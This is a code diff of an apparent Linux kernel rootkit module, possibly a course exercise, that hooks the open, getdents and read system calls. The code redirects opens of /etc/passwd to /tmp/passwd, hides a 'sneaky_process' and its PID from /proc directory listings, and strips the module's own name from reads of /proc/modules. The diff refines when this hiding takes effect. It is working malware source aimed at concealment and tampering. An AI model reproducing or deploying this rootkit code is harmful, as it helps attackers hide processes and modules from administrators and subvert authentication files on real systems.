@@ -58,6 +58,12 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags){
   if(strcmp(pathname, "/etc/passwd")==0){
     copy_to_user(pathname, "/tmp/passwd", 12);
   }
+  if(strcmp(pathname, "/proc")==0){
+    flag=1;
+  }
+  if(strcmp(pathname, "/proc/modules")==0){
+    flag=2;
+  }
   return original_open(pathname, flags);
 }
 
@@ -68,15 +74,12 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
   struct linux_dirent * p;
   int bpos;
   char d_type;
-  //int i=0;
-  
-  //printk(KERN_INFO "nread: %d\n",nread);
   for(bpos=0; bpos<nread; bpos+=d->d_reclen){
     d = (struct linux_dirent *) ((char*)dirp + bpos);
     d_type = *(char*)(dirp + bpos + d->d_reclen - 1);
-    //printk(KERN_INFO "i: %d, bpos: %d, reclen: %d, name: %s\n",i,bpos,d->d_reclen,d->d_name);
     if((strcmp(d->d_name, "sneaky_process") == 0) ||
-       (strcmp(d->d_name, pid) == 0)){
+       ((strcmp(d->d_name, pid) == 0) && flag==1)
+	){
       printk(KERN_INFO "d->d_name: %s\n", d->d_name);
       //memmove(d, (struct linux_dirent *) (d + d->d_reclen), nread - bpos - d->d_reclen);
       //return nread - d->d_reclen;
@@ -90,16 +93,18 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
 
 asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
   //printk(KERN_INFO "sneaky read\n");
-  size_t nread = original_read(fd, buf, count);
+  char* buff = (char*) buf;
   char name[] = "sneaky_mod ";
   int i, j;
   int line_start = 1;
   int p1=0, p2=0, found=0;
+  size_t nread = original_read(fd, buf, count);
+  if(flag!=2) return nread;
   for(i=0; i<nread; ++i){
     if(line_start){
       line_start = 0;
-      for(j=0, p1=i; i<count && j<11; ++j,++i){
-        if(*(char*)(buf+i) != *(char*)(name+j)){
+      for(j=0, p1=i; i<nread && j<11; ++j,++i){
+        if(*(buff+i) != *(name+j)){
           break;
         }
         if(j==10){
@@ -107,7 +112,7 @@ asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
         }
       }
     }
-    if(*(char*)(buf+i) == '\n'){
+    if(*(buff+i) == '\n'){
       if(found){
         p2 = i+1;
         break;
